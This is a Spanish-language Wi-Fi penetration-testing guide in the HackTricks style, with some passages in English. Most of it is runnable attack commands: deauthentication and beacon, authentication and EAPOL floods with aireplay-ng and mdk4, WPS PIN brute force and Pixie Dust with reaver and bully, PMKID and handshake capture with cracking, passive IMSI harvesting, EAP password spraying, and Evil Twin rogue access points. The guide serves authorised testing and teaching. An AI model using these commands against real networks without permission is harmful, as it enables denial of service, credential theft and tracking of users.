# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandos básicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Herramientas

### Hijacker & NexMon (Wi-Fi interno de Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ejecutar airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Puede realizar ataques Evil Twin, KARMA y Known Beacons y luego usar una plantilla de phishing para obtener la contraseña real de la red o capturar credenciales de redes sociales.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta herramienta automatiza ataques **WPS/WEP/WPA-PSK**. Hará automáticamente:

- Poner la interfaz en modo monitor
- Escanear redes posibles - y permitirte seleccionar la(s) víctima(s)
- Si WEP - Lanzar ataques WEP
- Si WPA-PSK
- Si WPS: Pixie dust attack y bruteforce attack (ten cuidado: el bruteforce attack puede llevar mucho tiempo). Observa que no intenta null PIN ni database/generated PINs.
- Intentar capturar el PMKID del AP para crackearlo
- Intentar desautenticar clientes del AP para capturar un handshake
- Si PMKID o Handshake, intentar bruteforce usando las top5000 passwords.

## Resumen de ataques

- **DoS**
- Deauthentication/disassociation -- Desconectar a todos (o un ESSID/Cliente específico)
- Random fake APs -- Ocultar redes, posible crash de scanners
- Overload AP -- Intentar dejar fuera de servicio el AP (normalmente no muy útil)
- WIDS -- Jugar con el IDS
- TKIP, EAPOL -- Algunos ataques específicos para DoS de ciertos APs
- **Cracking**
- Crack **WEP** (varias herramientas y métodos)
- **WPA-PSK**
- WPS pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Útil para capturar credenciales de captive portal y/o realizar ataques en la LAN
- **WPA-PSK** Evil Twin -- Útil para ataques en la red si conoces la contraseña
- **WPA-MGT** -- Útil para capturar credenciales de empresa
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Útil para capturar credenciales de captive portal y/o realizar ataques en la LAN
- **+ WPA** -- Útil para capturar WPA handshakes

## DOS

### Deauthentication Packets

**Descripción de** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, un método prevalente en el hacking Wi-Fi, implican falsificar tramas de "management" para **forzar la desconexión de dispositivos de una red**. Estos paquetes sin cifrar engañan a los clientes haciéndoles creer que provienen de la red legítima, permitiendo a los atacantes recopilar WPA handshakes con fines de cracking o interrumpir persistentemente las conexiones de red. Esta táctica, alarmante en su sencillez, se usa ampliamente y tiene implicaciones significativas para la seguridad de la red.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 significa deauthentication
- 1 es el número de deauths a enviar (puedes enviar varios si lo deseas); 0 significa enviarlos continuamente
- -a 00:14:6C:7E:40:80 es la dirección MAC del punto de acceso (AP)
- -c 00:0F:B5:34:30:30 es la dirección MAC del cliente a deauthenticate; si esto se omite entonces se envía un broadcast deauthentication (no siempre funciona)
- ath0 es el nombre de la interfaz

### Paquetes de desasociación

**Paquetes de desasociación**, similares a los deauthentication packets, son un tipo de trama de gestión utilizada en redes Wi‑Fi. Estos paquetes sirven para cortar la conexión entre un dispositivo (como un portátil o smartphone) y un punto de acceso (AP). La diferencia principal entre disassociation y deauthentication radica en sus escenarios de uso. Mientras que un AP emite **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, reinicio, o reubicación, lo que requiere la desconexión de todos los nodos conectados.

**This attack can be performed by mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Más ataques DOS por mdk4**

**En** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envía tramas beacon para mostrar APs falsos a los clientes. Esto puede, en ocasiones, hacer que los escáneres de red e incluso los controladores se bloqueen.
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Enviar authentication frames a todos los Access Points (APs) accesibles dentro del alcance puede sobrecargar estos APs, especialmente cuando hay numerosos clientes involucrados. Este tráfico intenso puede provocar inestabilidad del sistema, haciendo que algunos APs se congelen o incluso se reinicien.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica si un SSID se muestra correctamente y confirma el alcance del AP. Esta técnica, junto con **bruteforcing hidden SSIDs** con o sin wordlist, ayuda a identificar y acceder a redes ocultas.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Enviar paquetes aleatorios o duplicados a diferentes colas QoS puede activar Michael Countermeasures en **TKIP APs**, provocando un apagado del AP durante un minuto. Este método es una táctica de ataque **DoS** (Denial of Service) eficiente.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Inundar un AP con **EAPOL Start frames** crea **fake sessions**, saturando el AP y bloqueando a los clientes legítimos. Alternativamente, inyectar **fake EAPOL Logoff messages** desconecta forzosamente a los clientes; ambos métodos interrumpen eficazmente el servicio de la red.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacks for IEEE 802.11s mesh networks**

Varios ataques a la gestión de enlaces y al enrutamiento en redes mesh.

**ATTACK MODE w: WIDS Confusion**

Conectar clientes a varios nodos WDS o a rogue APs puede manipular los sistemas de detección y prevención de intrusiones, creando confusión y potencial abuso del sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Un packet fuzzer con diversas packet sources y un conjunto completo de modificadores para la packet manipulation.

### **Airggedon**

_**Airgeddon**_ ofrece la mayoría de los ataques propuestos en los comentarios anteriores:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifica el proceso de conectar dispositivos a un router, aumentando la velocidad y facilidad de la configuración para redes cifradas con **WPA** o **WPA2** Personal. No es eficaz para la seguridad WEP, que es fácilmente comprometida. WPS emplea un PIN de 8 dígitos, validado en dos mitades, lo que lo hace susceptible a ataques de fuerza bruta debido a su número limitado de combinaciones (11,000 posibilidades).

### WPS Bruteforce

There are 2 main tools to perform this action: Reaver and Bully.

- **Reaver** ha sido diseñado para ser un ataque robusto y práctico contra WPS, y ha sido probado contra una amplia variedad de access points y implementaciones de WPS.
- **Bully** es una **nueva implementación** del ataque de fuerza bruta WPS, escrito en C. Tiene varias ventajas sobre el código original de reaver: menos dependencias, mejor rendimiento de memoria y CPU, manejo correcto de la endianness, y un conjunto de opciones más robusto.

El ataque explota la **vulnerabilidad del WPS PIN**, particularmente la exposición de los primeros cuatro dígitos y el papel del último dígito como checksum, lo que facilita el ataque de fuerza bruta. Sin embargo, las defensas contra ataques de fuerza bruta, como **blocking MAC addresses** de atacantes agresivos, exigen **MAC address rotation** para continuar el ataque.

Al obtener el WPS PIN con herramientas como Bully o Reaver, el atacante puede deducir la WPA/WPA2 PSK, asegurando **acceso persistente a la red**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Este enfoque refinado apunta a los WPS PINs usando vulnerabilidades conocidas:

1. **Pre-discovered PINs**: Utiliza una base de datos de PINs conocidos vinculados a fabricantes específicos que tienden a usar PINs WPS uniformes. Esta base de datos correlaciona los primeros tres octetos de las MAC-addresses con los PINs probables para esos fabricantes.
2. **PIN Generation Algorithms**: Emplea algoritmos como ComputePIN y EasyBox, que calculan WPS PINs basados en la MAC-address del AP. El Arcadyan algorithm además requiere un device ID, añadiendo una capa al proceso de generación de PIN.

### WPS Pixie Dust attack

**Dominique Bongard** descubrió un fallo en algunos Access Points (APs) relacionado con la creación de códigos secretos, conocidos como **nonces** (**E-S1** y **E-S2**). Si se pueden recuperar esos nonces, romper el WPS PIN del AP se vuelve sencillo. El AP revela el PIN dentro de un código especial (hash) para probar que es legítimo y no un AP falso (rogue). Esos nonces son, esencialmente, las "llaves" para abrir la "caja fuerte" que contiene el WPS PIN. Más información puede encontrarse [aquí](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

En términos simples, el problema es que algunos APs no usaban claves lo suficientemente aleatorias para cifrar el PIN durante el proceso de conexión. Esto hace que el PIN sea vulnerable a ser adivinado desde fuera de la red (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si no quieres cambiar el dispositivo a monitor mode, o `reaver` y `bully` tienen algún problema, puedes probar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta herramienta puede realizar un Pixie Dust attack sin necesidad de cambiar a monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Algunos sistemas mal diseñados incluso permiten que un **Null PIN** (un PIN vacío o inexistente) otorgue acceso, lo cual es bastante inusual. La herramienta **Reaver** es capaz de probar esta vulnerabilidad, a diferencia de **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos los ataques WPS propuestos se pueden realizar fácilmente usando _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 te permiten probar **tu PIN personalizado** (si tienes alguno)
- 7 and 8 realizan la **Pixie Dust attack**
- 13 te permite probar el **NULL PIN**
- 11 and 12 **recuperarán los PINs relacionados con el AP seleccionado desde bases de datos disponibles** y **generarán** posibles **PINs** usando: ComputePIN, EasyBox y opcionalmente Arcadyan (recomendado, ¿por qué no?)
- 9 and 10 probarán **todos los PINs posibles**

## **WEP**

Muy roto y sin uso hoy en día. Solo ten en cuenta que _**airgeddon**_ tiene una opción WEP llamada "All-in-One" para atacar este tipo de protección. Más herramientas ofrecen opciones similares.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) un nuevo método de ataque, único porque solo necesita **un único paquete** y no requiere que clientes estén conectados al AP objetivo—solo interacción entre el atacante y el AP.

Muchos routers modernos añaden un **campo opcional** al **primer frame EAPOL** durante la asociación, conocido como `Robust Security Network`. Esto incluye el `PMKID`.

Como explica la publicación original, el **PMKID** se crea usando datos conocidos:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que el "PMK Name" es constante, conocemos el BSSID del AP y de la station, y el `PMK` es idéntico al de un full 4-way handshake, **hashcat** puede usar esta información para crackear el PSK y recuperar la passphrase!

Para **recopilar** esta información y **bruteforce** localmente la contraseña, puedes hacer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Los **PMKIDs capturados** se mostrarán en la **consola** y también se **guardarán** dentro \_ **/tmp/attack.pcap**\_\
Ahora, convierte la captura al formato **hashcat/john** y crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Ten en cuenta que el formato de un hash correcto contiene **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si el tuyo **solo** contiene **3 partes**, entonces es **inválido** (la captura PMKID no fue válida).

Ten en cuenta que `hcxdumptool` **también captura handshakes** (aparecerá algo como: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Puedes **transformar** los **handshakes** al formato de **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Captura de handshake

Un ataque a redes **WPA/WPA2** puede ejecutarse capturando un **handshake** e intentando **crack** la password **offline**. Este proceso implica monitorear la comunicación de una red específica y el **BSSID** en un **channel** particular. Aquí tienes una guía simplificada:

1. Identifica el **BSSID**, **channel**, y un **connected client** de la red objetivo.
2. Usa `airodump-ng` para monitorear el tráfico de la red en el channel y BSSID especificados, con la esperanza de capturar un handshake. El comando se verá así:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar la probabilidad de capturar un handshake, desconecta momentáneamente al cliente de la red para forzar una reautenticación. Esto se puede hacer usando el comando `aireplay-ng`, que envía paquetes de desautenticación al cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Tenga en cuenta que, como el cliente fue deauthenticated, podría intentar conectarse a un AP diferente o, en otros casos, a una red distinta._

Una vez que en `airodump-ng` aparece información de handshake, esto significa que el handshake fue capturado y puedes dejar de escuchar:

![](<../../images/image (172) (1).png>)

Una vez que el handshake fue capturado, puedes **crack**arlo con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Comprobar si hay handshake en el archivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si esta herramienta encuentra un handshake incompleto de un ESSID antes del handshake completado, no detectará el válido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

En **configuraciones de WiFi empresariales, encontrarás varios métodos de autenticación**, cada uno proporcionando distintos niveles de seguridad y funciones de gestión. Cuando uses herramientas como `airodump-ng` para inspeccionar el tráfico de red, podrías notar identificadores para estos tipos de autenticación. Algunos métodos comunes incluyen:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Este método soporta hardware tokens y one-time passwords dentro de EAP-PEAP. A diferencia de MSCHAPv2, no usa un peer challenge y envía las contraseñas en texto plano al access point, lo que supone un riesgo para downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Implica enviar el hash MD5 de la contraseña desde el cliente. No es **recomendado** debido a su vulnerabilidad a ataques de diccionario, falta de autenticación del servidor y la incapacidad para generar claves WEP específicas de sesión.
3. **EAP-TLS (Transport Layer Security)**:
- Utiliza certificados del lado cliente y del lado servidor para la autenticación y puede generar dinámicamente claves WEP basadas en el usuario y en la sesión para asegurar las comunicaciones.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Proporciona autenticación mutua a través de un túnel cifrado, junto con un método para derivar claves WEP dinámicas por usuario y por sesión. Requiere solo certificados del servidor, mientras los clientes usan credenciales.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funciona de manera similar a EAP creando un túnel TLS para la comunicación protegida. Permite el uso de protocolos de autenticación más débiles sobre EAP debido a la protección ofrecida por el túnel.
- **PEAP-MSCHAPv2**: A menudo denominado PEAP, combina el vulnerable mecanismo challenge/response de MSCHAPv2 con un túnel TLS protector.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Similar a EAP-TLS pero inicia un túnel TLS antes de intercambiar certificados, ofreciendo una capa adicional de seguridad.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **nombre de usuario** is going to be sent in **claro** in the **"Response Identity"** messages.

Even using one of the most secure of authentication methods: **PEAP-EAP-TLS**, it is possible to **capture the username sent in the EAP protocol**. To do so, **capture a authentication communication** (start `airodump-ng` inside a channel and `wireshark` in the same interface) and filter the packets by`eapol`.\
Inside the "**Response, Identity**" packet, the **nombre de usuario** of the client will appear.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding is supported by both EAP-PEAP and EAP-TTLS. In the context of a WiFi network, an EAP-Identity request is typically initiated by the access point (AP) during the association process. To ensure the protection of user anonymity, the response from the EAP client on the user's device contains only the essential information required for the initial RADIUS server to process the request. This concept is illustrated through the following scenarios:

- EAP-Identity = anonymous
- En este escenario, todos los usuarios emplean el seudónimo "anonymous" como su identificador de usuario. The initial RADIUS server functions as either an EAP-PEAP or EAP-TTLS server, responsible for managing the server-side of the PEAP or TTLS protocol. The inner (protected) authentication method is then either handled locally or delegated to a remote (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- En esta situación, usuarios de diferentes realms ocultan sus identidades mientras indican sus respectivos realms. This allows the initial RADIUS server to proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms, which act as the PEAP or TTLS server. The initial RADIUS server operates solely as a RADIUS relay node.
- Alternatively, the initial RADIUS server may function as the EAP-PEAP or EAP-TTLS server and either handle the protected authentication method or forward it to another server. This option facilitates the configuration of distinct policies for various realms.

In EAP-PEAP, once the TLS tunnel is established between the PEAP server and the PEAP client, the PEAP server initiates an EAP-Identity request and transmits it through the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user's true identity through the encrypted tunnel. This approach effectively prevents the revelation of the user's actual identity to anyone eavesdropping on the 802.11 traffic.

EAP-TTLS follows a slightly different procedure. With EAP-TTLS, the client typically authenticates using PAP or CHAP, secured by the TLS tunnel. In this case, the client includes a User-Name attribute and either a Password or CHAP-Password attribute in the initial TLS message sent after tunnel establishment.

Regardless of the protocol chosen, the PEAP/TTLS server obtains knowledge of the user's true identity after the TLS tunnel has been established. The true identity can be represented as user@realm or simply user. If the PEAP/TTLS server is also responsible for authenticating the user, it now possesses the user's identity and proceeds with the authentication method protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user's home RADIUS server. This new RADIUS request omits the PEAP or TTLS protocol layer. In cases where the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user's true identity, replacing the anonymous User-Name from the incoming RADIUS request. When the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes extracted from the TLS payload are substituted in the outgoing RADIUS message, displacing the anonymous User-Name and TTLS EAP-Message attributes found in the incoming RADIUS request.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Haga clic para expandir</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notas:
- Funciona antes de cualquier túnel TLS si la implementación usa EAP‑SIM/AKA sin identidad protegida/pseudónimos.
- El valor expuesto es un identificador permanente vinculado a la SIM del suscriptor; su recolección permite el seguimiento a largo plazo y abusos posteriores en telecomunicaciones.

Impacto
- Privacidad: seguimiento persistente de usuarios/dispositivos a partir de capturas pasivas de Wi‑Fi en lugares públicos.
- Abuso en telecomunicaciones (puerta de entrada): con el IMSI, un atacante con acceso a SS7/Diameter puede consultar la ubicación o intentar interceptar llamadas/SMS y robar MFA.

Mitigaciones / qué buscar
- Verificar que los clientes usen anonymous outer identities (pseudonyms) para EAP‑SIM/AKA según la guía 3GPP (p.ej., 3GPP TS 33.402).
- Preferir tunelizar la fase de identidad (p.ej., EAP‑TTLS/PEAP carrying inner EAP‑SIM/AKA) para que el IMSI nunca se envíe en claro.
- Las capturas de paquetes de association/auth nunca deberían revelar un IMSI en claro en EAP-Response/Identity.

Relacionado: explotación de señalización en telecomunicaciones con identificadores móviles capturados
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Si se espera que el cliente use un **username and password** (nota que **EAP-TLS won't be valid** en este caso), entonces podrías intentar obtener una **lista** de **usernames** (ver la parte siguiente) y **passwords** y probar a **bruteforce** el acceso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
También puedes realizar este ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoría de ataques al cliente

### Selección de red y roaming

- El protocolo 802.11 define cómo una estación se une a un Extended Service Set (ESS) pero no especifica los criterios para seleccionar un ESS o un access point (AP) dentro de él.
- Las estaciones pueden hacer roaming entre APs que comparten el mismo ESSID, manteniendo la conectividad a lo largo de un edificio o área.
- El protocolo requiere la autenticación de la estación al ESS pero no obliga a la autenticación del AP hacia la estación.

### Preferred Network Lists (PNLs)

- Las estaciones almacenan el ESSID de cada red inalámbrica a la que se conectan en su Preferred Network List (PNL), junto con detalles de configuración específicos de la red.
- La PNL se utiliza para conectarse automáticamente a redes conocidas, mejorando la experiencia del usuario al agilizar el proceso de conexión.

### Escaneo pasivo

- Los APs transmiten periódicamente beacon frames, anunciando su presencia y características, incluido el ESSID del AP a menos que la difusión esté deshabilitada.
- Durante el escaneo pasivo, las estaciones escuchan los beacon frames. Si el ESSID de un beacon coincide con una entrada en la PNL de la estación, la estación puede conectarse automáticamente a ese AP.
- El conocimiento de la PNL de un dispositivo permite una posible explotación al imitar el ESSID de una red conocida, engañando al dispositivo para que se conecte a un AP malicioso.

### Active Probing

- El active probing implica que las estaciones envíen probe requests para descubrir APs cercanos y sus características.
- Los directed probe requests van dirigidos a un ESSID específico, ayudando a detectar si una red particular está dentro del alcance, incluso si es una red oculta.
- Los broadcast probe requests tienen el campo SSID nulo y se envían a todos los APs cercanos, permitiendo que la estación verifique cualquier red preferida sin revelar el contenido de su PNL.

## AP simple con redirección a Internet

Antes de explicar cómo realizar ataques más complejos, se va a explicar cómo simplemente crear un AP y redirigir su tráfico a una interfaz conectada a Internet.

Usando `ifconfig -a` comprueba que la interfaz wlan para crear el AP y la interfaz conectada a Internet estén presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crea el archivo de configuración `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Luego, **configura las IPs** y **las rutas**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
A continuación **inicia** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crea un archivo de configuración `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Detener procesos molestos** , configurar **monitor mode**, y **iniciar hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Reenvío y redirección
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un ataque Evil Twin explota la forma en que los clientes WiFi reconocen las redes, basándose principalmente en el nombre de la red (ESSID) sin requerir que la base station (access point) se autentique ante el cliente. Puntos clave:

- **Dificultad para diferenciar**: Los dispositivos tienen problemas para distinguir entre access points legítimos y rogue cuando comparten el mismo ESSID y tipo de cifrado. Las redes reales a menudo usan múltiples access points con el mismo ESSID para extender la cobertura sin interrupciones.
- **Client Roaming and Connection Manipulation**: El protocolo 802.11 permite que los dispositivos hagan roaming entre access points dentro del mismo ESS. Los atacantes pueden explotar esto atrayendo a un dispositivo para que se desconecte de su base station actual y se conecte a una rogue. Esto se puede lograr ofreciendo una señal más fuerte o interrumpiendo la conexión al access point legítimo mediante métodos como deauthentication packets o jamming.
- **Challenges in Execution**: Ejecutar con éxito un ataque Evil Twin en entornos con múltiples access points bien colocados puede ser complicado. Deauthenticating un único access point legítimo a menudo hace que el dispositivo se conecte a otro access point legítimo, a menos que el atacante pueda deauthenticatear todos los access points cercanos o colocar estratégicamente la rogue access point.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
También puedes crear un Evil Twin usando **eaphammer** (nota: para crear Evil Twins con eaphammer la interfaz **no debe** estar en modo **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
O usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

